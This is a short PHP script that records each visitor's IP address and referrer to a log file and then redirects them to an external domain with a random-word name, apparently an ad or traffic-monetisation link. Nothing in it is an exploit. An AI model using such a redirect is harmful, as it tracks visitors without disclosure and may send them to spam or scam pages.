<?php
// Set the target URL (your redirect destination)
$redirect_url = "https://prosecutorremarkablegodforsaken.com/nn2nhd4d?key=724e008194e301639be4bf6f8f164f24";

// Capture visitor data (optional for tracking)
$ip = $_SERVER['REMOTE_ADDR'];  // Get IP address
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Log visitor data (Optional: Store in a file or database)
file_put_contents("redirect_log.txt", "IP: $ip - Referrer: $referrer - Time: " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);

// Redirect user to the target URL
header("Location: $redirect_url");
exit();
?>
